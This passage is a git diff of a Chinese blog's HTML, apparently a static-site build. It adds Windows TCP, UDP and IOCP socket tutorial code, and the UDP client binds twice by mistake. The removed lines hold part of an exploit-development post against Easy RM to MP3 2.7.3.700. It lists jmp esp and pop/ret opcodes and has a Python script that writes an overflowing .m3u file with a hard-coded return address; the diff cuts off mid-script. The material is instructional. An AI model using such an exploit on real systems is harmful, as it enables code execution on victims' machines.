&#123;0&#125;;</span><br><span class="line">	int Iret;</span><br><span class="line"></span><br><span class="line">	Iret = WSAStartup(MAKEWORD(2, 2), &amp;wd);</span><br><span class="line">	if (Iret!=0)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;初始化错误\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	//2. 创建套接字</span><br><span class="line">	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"></span><br><span class="line">	//3. 发起连接</span><br><span class="line">	sockaddr_in Saddr = &#123; 0 &#125;;</span><br><span class="line">	Saddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);</span><br><span class="line">	Saddr.sin_port = htons(0x1234);</span><br><span class="line">	Saddr.sin_family = AF_INET;</span><br><span class="line"></span><br><span class="line">	Iret = connect(</span><br><span class="line">		sock,					//套接字</span><br><span class="line">		(sockaddr*)&amp;Saddr,		//服务端地址</span><br><span class="line">		sizeof(Saddr)			//地址大小</span><br><span class="line">	);</span><br><span class="line">	if (Iret==SOCKET_ERROR)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;链接失败\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	//4. 发送接收数据</span><br><span class="line"></span><br><span class="line">	char buff[1024] = &#123;0 &#125;;</span><br><span class="line">	while (true)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;输入要发送的消息： &quot;);</span><br><span class="line">		gets_s(buff, 1024);</span><br><span class="line">		send(sock, buff, 1024, 0);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	//发送断开连接</span><br><span class="line">	shutdown(sock, SD_BOTH);</span><br><span class="line"></span><br><span class="line">	//5. 关闭套接字</span><br><span class="line">	closesocket(sock);</span><br><span class="line"></span><br><span class="line">	//6. 清理环境</span><br><span class="line">	WSACleanup();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-
+<blockquote>
+<p>UDP_Socket</p>
+</blockquote>
+<ul>
+<li><p>UDP服务端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#define _WINSOCK_DEPRECATED_NO_WARNINGS </span><br><span class="line">#include &lt;WinSock2.h&gt;</span><br><span class="line">#pragma comment(lib,&quot;ws2_32.lib&quot;)</span><br><span class="line"></span><br><span class="line">//UDP服务</span><br><span class="line"></span><br><span class="line">//1.初始环境</span><br><span class="line">//2.创建套接字</span><br><span class="line">//3.绑定地址</span><br><span class="line">//4.接收数据（发送数据）</span><br><span class="line">//5.关闭套接字</span><br><span class="line">//6.清理环境</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	//1.初始环境</span><br><span class="line">	WSADATA wd = &#123; 0 &#125;;</span><br><span class="line">	int Iret;</span><br><span class="line"></span><br><span class="line">	Iret = WSAStartup(MAKEWORD(2, 2), &amp;wd);</span><br><span class="line">	if (Iret != 0)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;初始化错误\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	//2.创建套接字</span><br><span class="line">	SOCKET Sock = socket(</span><br><span class="line">		AF_INET,		//通信协议</span><br><span class="line">		SOCK_DGRAM,		//套接字类型报文协议</span><br><span class="line">		IPPROTO_UDP		//具体协议</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	//3.绑定地址</span><br><span class="line">	sockaddr_in Saddr = &#123; 0 &#125;;</span><br><span class="line">	Saddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);</span><br><span class="line">	Saddr.sin_port = htons(0x1234);</span><br><span class="line">	Saddr.sin_family = AF_INET;</span><br><span class="line">	Iret = bind(</span><br><span class="line">		Sock,				  //绑定的套接字</span><br><span class="line">		(sockaddr*)&amp;Saddr,	  //绑定服务地址</span><br><span class="line">		sizeof(Saddr)		  //地址大小</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	//4.接收数据（发送数据）</span><br><span class="line">	char buff[1024] = &#123; 0 &#125;;</span><br><span class="line">	sockaddr_in Caddr = &#123; 0 &#125;;		//客户端地址</span><br><span class="line">	int CaddrSize = sizeof(Caddr);	//地址大小</span><br><span class="line"></span><br><span class="line">	recvfrom(</span><br><span class="line">		Sock,				//套接字</span><br><span class="line">		buff,				//数据缓冲区</span><br><span class="line">		1024,				//数据大小</span><br><span class="line">		0,					//标志</span><br><span class="line">		(sockaddr*)&amp;Caddr,	//客户地址</span><br><span class="line">		&amp;CaddrSize			//地址大小</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	printf(&quot;收到客户消息：%s&quot;, buff);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		//发送数据</span><br><span class="line">	char buff2[1024] = &#123; &quot;hello Clinet\n&quot; &#125;;</span><br><span class="line">	sendto(</span><br><span class="line">		Sock,					//套接字</span><br><span class="line">		buff2,					//缓冲区</span><br><span class="line">		1024,					//缓冲区大小</span><br><span class="line">		0,						//标志</span><br><span class="line">		(sockaddr*)&amp;Caddr,		//客户端地址</span><br><span class="line">		CaddrSize				//地址大小</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	//5.关闭套接字</span><br><span class="line">	closesocket(Sock);</span><br><span class="line"></span><br><span class="line">	//6.清理环境</span><br><span class="line">	WSACleanup();</span><br><span class="line"></span><br><span class="line">	system(&quot;pause&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>UDP客户端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#define _WINSOCK_DEPRECATED_NO_WARNINGS </span><br><span class="line">#include &lt;WinSock2.h&gt;</span><br><span class="line">#pragma comment(lib,&quot;ws2_32.lib&quot;)</span><br><span class="line"></span><br><span class="line">//UDP客户端</span><br><span class="line"></span><br><span class="line">//1.初始环境</span><br><span class="line">//2.创建套接字</span><br><span class="line">//3.绑定地址</span><br><span class="line">//4.发送数据(接收数据）</span><br><span class="line">//5.关闭套接字</span><br><span class="line">//6.清理环境</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	//1.初始环境</span><br><span class="line">	WSADATA wd = &#123; 0 &#125;;</span><br><span class="line">	int Iret;</span><br><span class="line"></span><br><span class="line">	Iret = WSAStartup(MAKEWORD(2, 2), &amp;wd);</span><br><span class="line">	if (Iret != 0)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;初始化错误\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	//2.创建套接字</span><br><span class="line">	SOCKET Sock = socket(</span><br><span class="line">		AF_INET,		//通信协议</span><br><span class="line">		SOCK_DGRAM,		//套接字类型报文协议</span><br><span class="line">		IPPROTO_UDP		//具体协议</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	//3.绑定地址</span><br><span class="line"></span><br><span class="line">	//客户地址</span><br><span class="line">	sockaddr_in Caddr = &#123; 0 &#125;;</span><br><span class="line">	Caddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);</span><br><span class="line">	Caddr.sin_port = htons(0x1236);	//客户发送数据端口</span><br><span class="line">	Caddr.sin_family = AF_INET;</span><br><span class="line">	Iret = bind(</span><br><span class="line">		Sock,				  //绑定的套接字</span><br><span class="line">		(sockaddr*)&amp;Caddr,	  //绑定服务地址</span><br><span class="line">		sizeof(Caddr)		  //地址大小</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	//4.发送数据(接收数据）</span><br><span class="line">	//服务器地址</span><br><span class="line">	sockaddr_in Saddr = &#123; 0 &#125;;</span><br><span class="line">	Saddr.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;);</span><br><span class="line">	Saddr.sin_port = htons(0x1234);</span><br><span class="line">	Saddr.sin_family = AF_INET;</span><br><span class="line">	Iret = bind(</span><br><span class="line">		Sock,				  //绑定的套接字</span><br><span class="line">		(sockaddr*)&amp;Saddr,	  //绑定服务地址</span><br><span class="line">		sizeof(Saddr)		  //地址大小</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	char buff[1024] = &#123; &quot;hello: Server\n&quot; &#125;;</span><br><span class="line">	sendto(Sock, buff, 1024, 0, (sockaddr*)&amp;Saddr, sizeof(Saddr));</span><br><span class="line"></span><br><span class="line">	//接收消息</span><br><span class="line">	int addrSize=sizeof(Saddr);</span><br><span class="line">	recvfrom(Sock, buff, 1024, 0, (sockaddr*)&amp;Saddr, &amp;addrSize);</span><br><span class="line">	printf(&quot;接收服务消息：%s&quot;, buff);</span><br><span class="line"></span><br><span class="line">	//5.关闭套接字</span><br><span class="line">	closesocket(Sock);</span><br><span class="line">	//6.清理环境</span><br><span class="line">	WSACleanup();</span><br><span class="line">	system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<blockquote>
+<p>网络编程完成端口IOCP</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#define _WINSOCK_DEPRECATED_NO_WARNINGS </span><br><span class="line">#include &lt;WinSock2.h&gt;</span><br><span class="line">#include &lt;process.h&gt;</span><br><span class="line">#pragma comment(lib,&quot;ws2_32.lib&quot;)</span><br><span class="line"></span><br><span class="line">//1.初始环境</span><br><span class="line">//2.创建套接字</span><br><span class="line">//3.绑定</span><br><span class="line">//4.监听</span><br><span class="line">//5.创建完成端口</span><br><span class="line">//6.开辟工作线程</span><br><span class="line">//7.等待客户连接</span><br><span class="line">//8.完成端口与客户套接字绑定</span><br><span class="line">//9.发起IO读取数据 WSARecv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//C++继承，对OVERLAPPED进行扩展，方便在工作线程使用</span><br><span class="line">struct MYOVERLAPPED : OVERLAPPED</span><br><span class="line">&#123;</span><br><span class="line">	SOCKET m_Csock;		//客户端套接字</span><br><span class="line">	sockaddr_in m_addr;	//客户信息</span><br><span class="line">	WSABUF m_buf;		//消息缓冲区</span><br><span class="line"></span><br><span class="line">	MYOVERLAPPED(SOCKET sock, sockaddr_in addr) :m_buf(), OVERLAPPED()</span><br><span class="line">	&#123;</span><br><span class="line">		m_Csock = sock;		//客户端套接字</span><br><span class="line">		m_addr = addr;		///客户信息</span><br><span class="line">		m_buf.buf = new char[1024]&#123;&#125;;</span><br><span class="line">		m_buf.len = 1024;</span><br><span class="line">	&#125;</span><br><span class="line">	~MYOVERLAPPED()</span><br><span class="line">	&#123;</span><br><span class="line">		if (m_buf.buf!=NULL)</span><br><span class="line">		&#123;</span><br><span class="line">			delete[] m_buf.buf;</span><br><span class="line">			m_buf.buf = NULL;</span><br><span class="line">		&#125;</span><br><span class="line">		if (m_Csock!=NULL)</span><br><span class="line">		&#123;</span><br><span class="line">			closesocket(m_Csock);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLE g_hcompPort;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//工作线程</span><br><span class="line">unsigned _stdcall workThread(void *param)</span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwReadSize=0;</span><br><span class="line">	DWORD dwKey=0;</span><br><span class="line">	MYOVERLAPPED *pov;</span><br><span class="line">	BOOL bRet;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	while (true)</span><br><span class="line">	&#123;</span><br><span class="line">		bRet = GetQueuedCompletionStatus(</span><br><span class="line">			g_hcompPort,</span><br><span class="line">			&amp;dwReadSize,</span><br><span class="line">			&amp;dwKey,</span><br><span class="line">			(OVERLAPPED**)&amp;pov,</span><br><span class="line">			-1</span><br><span class="line">		);</span><br><span class="line"></span><br><span class="line">		if (bRet!=FALSE &amp;&amp; pov!=NULL)</span><br><span class="line">		&#123;</span><br><span class="line">			//客户掉线了</span><br><span class="line">			if (pov-&gt;InternalHigh==0)</span><br><span class="line">			&#123;</span><br><span class="line">				printf(&quot;客户%s掉线了\n&quot;, inet_ntoa(pov-&gt;m_addr.sin_addr));</span><br><span class="line">				delete pov; //删除ov结构体</span><br><span class="line">				continue;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			printf(&quot;客户%s: 内容：%s\n&quot;,</span><br><span class="line">				inet_ntoa(pov-&gt;m_addr.sin_addr),</span><br><span class="line">				pov-&gt;m_buf.buf</span><br><span class="line">			);</span><br><span class="line"></span><br><span class="line">			//再次发起IO,读取下次任务</span><br><span class="line">			DWORD dwReadSize = 0;</span><br><span class="line">			DWORD dwFlag=0;</span><br><span class="line">			WSARecv(</span><br><span class="line">				pov-&gt;m_Csock,</span><br><span class="line">				&amp;pov-&gt;m_buf,</span><br><span class="line">				1,</span><br><span class="line">				&amp;dwReadSize,</span><br><span class="line">				&amp;dwFlag,</span><br><span class="line">				pov,</span><br><span class="line">				NULL</span><br><span class="line">			);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	//1.初始环境</span><br><span class="line">	WSADATA wd = &#123; 0 &#125;;</span><br><span class="line">	int Iret;</span><br><span class="line">	Iret = WSAStartup(</span><br><span class="line">		MAKEWORD(2, 2),		//请求的版本号 2.2</span><br><span class="line">		&amp;wd);				//版本信息</span><br><span class="line"></span><br><span class="line">	if (Iret != 0)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;初始化失败\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 2. 创建套接字</span><br><span class="line">	SOCKET Sscok = socket(</span><br><span class="line">		AF_INET,		//通信协议族</span><br><span class="line">		SOCK_STREAM,	//套接字类型</span><br><span class="line">		IPPROTO_TCP);	//协议类型</span><br><span class="line">	if (Sscok == INVALID_SOCKET)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;创建socket失败\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 3. 绑定</span><br><span class="line">	sockaddr_in Saddr = &#123; 0 &#125;;</span><br><span class="line">	Saddr.sin_addr.S_un.S_addr = inet_addr(&quot;192.168.43.157&quot;);</span><br><span class="line">	Saddr.sin_port = htons(0x1234);</span><br><span class="line">	Saddr.sin_family = AF_INET;</span><br><span class="line"></span><br><span class="line">	Iret = bind(</span><br><span class="line">		Sscok,				  //绑定的套接字</span><br><span class="line">		(sockaddr*)&amp;Saddr,	  //绑定服务地址</span><br><span class="line">		sizeof(Saddr)		  //地址大小</span><br><span class="line">	);</span><br><span class="line">	if (Iret == SOCKET_ERROR)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;绑定失败\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 4. 监听</span><br><span class="line">	listen(</span><br><span class="line">		Sscok,		//服务套接字</span><br><span class="line">		SOMAXCONN);	//连接最大数量</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	//5.创建完成端口</span><br><span class="line">	SYSTEM_INFO si = &#123;&#125;;</span><br><span class="line">	GetSystemInfo(&amp;si);</span><br><span class="line"></span><br><span class="line">	g_hcompPort = CreateIoCompletionPort(</span><br><span class="line">		INVALID_HANDLE_VALUE,			</span><br><span class="line">		NULL,</span><br><span class="line">		NULL,</span><br><span class="line">		si.dwNumberOfProcessors * 2</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	//6.开辟工作线程</span><br><span class="line">	for (int i=0;i&lt;si.dwNumberOfProcessors*2;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		_beginthreadex(NULL, NULL, workThread, NULL, NULL, NULL);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	//7.等待客户连接</span><br><span class="line">	while (true)</span><br><span class="line">	&#123;</span><br><span class="line">		sockaddr_in Caddr = &#123;0&#125;;</span><br><span class="line">		int CaddrSize = sizeof(Caddr);</span><br><span class="line"></span><br><span class="line">		SOCKET Csock = accept(Sscok, (sockaddr*)&amp;Caddr, &amp;CaddrSize);</span><br><span class="line"></span><br><span class="line">		//8.完成端口与客户套接字绑定</span><br><span class="line">		CreateIoCompletionPort(</span><br><span class="line">			(HANDLE)Csock,		//客户套接字</span><br><span class="line">			g_hcompPort,		//完成端口</span><br><span class="line">			NULL, NULL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		//9.发起IO读取数据 WSARecv</span><br><span class="line"></span><br><span class="line">		MYOVERLAPPED * pov = new MYOVERLAPPED(Csock, Caddr);</span><br><span class="line"></span><br><span class="line">		DWORD dwReadSize=0;</span><br><span class="line">		DWORD dwFlag = 0;</span><br><span class="line">		WSARecv(</span><br><span class="line">			Csock,		//客户套接字</span><br><span class="line">			&amp;pov-&gt;m_buf,		//消息缓冲区</span><br><span class="line">			1,			//缓冲区大小</span><br><span class="line">			&amp;dwReadSize,//实际读取大小</span><br><span class="line">			&amp;dwFlag,	//标志</span><br><span class="line">			pov,		//异步IO结构</span><br><span class="line">			NULL		//APC调用函数</span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
       
 
       
@@ -218,7 +227,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/Hook原理/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/08/20/windows网络编程/">展开全文 >></a>
         </p>
       
 
@@ -343,20 +352,20 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-迫使shellcode执行方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-下断技巧" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/迫使shellcode执行方法/">exploit_2_迫使shellcode执行方法</a>
+      <a class="article-title" href="/2018/08/20/下断技巧/">下段技巧</a>
     </h1>
   
 
 		
         
-        <a href="/2018/08/20/迫使shellcode执行方法/" class="archive-article-date">
+        <a href="/2018/08/20/下断技巧/" class="archive-article-date">
   	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
 </a>
         
@@ -365,28 +374,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>实验版本:<br>windows sp2<br>Easy RM to MP3 2.7.3.700<br>ollydbg</p>
-<p>跳转方法:</p>
-<ul>
-<li>jmp/call<br>如果有寄存器可以利用来跳转到shellcode,则可以使用该方法来进行跳转<br>例如:jmp esp/call esp</li>
-<li>pop retn/popad<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">popad 0x61</span><br><span class="line">pop eax 58</span><br><span class="line">pop ebx 5b</span><br><span class="line">pop ecx 59</span><br><span class="line">pop edx 5a</span><br><span class="line">pop esi 5e</span><br><span class="line">pop ebp 5d</span><br><span class="line">retn    C3</span><br><span class="line"></span><br><span class="line">python 脚本</span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">with open(&quot;crash.m3u&quot;,&quot;w+&quot;) as f:</span><br><span class="line">    f.write(&quot;\x41&quot; * (25000+1067))</span><br><span class="line">    f.write(&quot;\x5C\xDF\x80\x7C&quot; ) 